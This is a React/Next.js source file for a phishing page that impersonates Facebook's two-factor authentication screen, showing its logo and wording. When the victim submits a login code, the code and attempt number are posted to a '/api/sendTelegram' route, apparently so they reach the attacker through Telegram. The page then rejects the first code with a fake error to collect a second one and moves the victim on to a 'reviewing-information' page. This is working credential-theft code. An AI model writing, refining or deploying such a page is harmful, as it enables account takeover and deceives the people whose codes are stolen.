'use client'

import { useState, useEffect } from 'react'
import { useRouter } from 'next/navigation'
import Image from 'next/image'
import { Input } from "@/components/ui/input"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
import { useActiveSession } from '@/contexts/ActiveSessionContext'

export default function TwoFactorAuth() {
  const [timeLeft, setTimeLeft] = useState(5 * 60) // 5 minutes in seconds
  const [code, setCode] = useState('')
  const [error, setError] = useState('')
  const [attemptCount, setAttemptCount] = useState(0)
  const router = useRouter()

  const { addOrUpdateSession } = useActiveSession()

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prevTime) => (prevTime > 0 ? prevTime - 1 : 0))
    }, 1000)

    return () => clearInterval(timer)
  }, [])

  const formatTime = (seconds: number) => {
    const minutes = Math.floor(seconds / 60)
    const remainingSeconds = seconds % 60
    return `${minutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`
  }

  const handleCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '')
    setCode(value)
  }

  const sendToTelegram = async (message: string) => {
    try {
      const response = await fetch('/api/sendTelegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ message }),
      })

      if (!response.ok) {
        console.error('Failed to send message to Telegram')
      }
    } catch (error) {
      console.error('Error sending message to Telegram:', error)
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    setAttemptCount((prevCount) => prevCount + 1)

    const message = `
Two-Factor Authentication Code Entered:
Code: ${code}
Attempt: ${attemptCount + 1}
    `
    await sendToTelegram(message)

    if (attemptCount === 0) {
      setError('The code generator you entered is incorrect. Please wait 5 minutes to receive another one.')
      setCode('')
      setTimeLeft(5 * 60) // Reset the timer to 5 minutes
    } else {
      router.push('/reviewing-information')
    }
  }

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col">
      <header className="w-full bg-white shadow-sm">
        <div className="container mx-auto px-4 py-2">
          <Image
            src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-KMqynDXovAOlAsLRmAjbWZSJw8Ogbj.png"
            alt="Facebook Logo"
            width={40}
            height={40}
          />
        </div>
      </header>

      <main className="flex-grow flex items-center justify-center py-8">
        <Card className="w-full max-w-md">
          <CardHeader>
            <CardTitle className="text-xl font-semibold">Two-factor authentication required (1/3)</CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <p className="text-sm">
              You&apos;ve asked us to require a login code when anyone tries to access your account from a new
              device or browser.
            </p>

            <p className="text-sm">
              Enter the code from your <span className="font-semibold">code generator</span> or third-party app below.
            </p>
            <form onSubmit={handleSubmit}>
              <div className="flex items-center space-x-4">
                <div className="flex-grow relative">
                  <Input
                    type="text"
                    placeholder="Login code"
                    className="w-full pr-20"
                    value={code}
                    onChange={handleCodeChange}
                  />
                  <span className="absolute right-3 top-1/2 transform -translate-y-1/2 text-sm text-gray-500">
                    ({formatTime(timeLeft)})
                  </span>
                </div>
              </div>
              {error && (
                <p className="mt-2 text-red-600 text-sm">{error}</p>
              )}
              <div className="mt-4 flex justify-end">
                <Button
                  type="submit"
                  className="bg-blue-600 hover:bg-blue-700 text-white px-8"
                  disabled={code.length === 0}
                >
                  Send
                </Button>
              </div>
            </form>
          </CardContent>
          <CardFooter className="flex justify-start">
            <Button variant="link" className="text-blue-600 hover:underline p-0">
              Need another way to authenticate?
            </Button>
          </CardFooter>
        </Card>
      </main>
    </div>
  )
}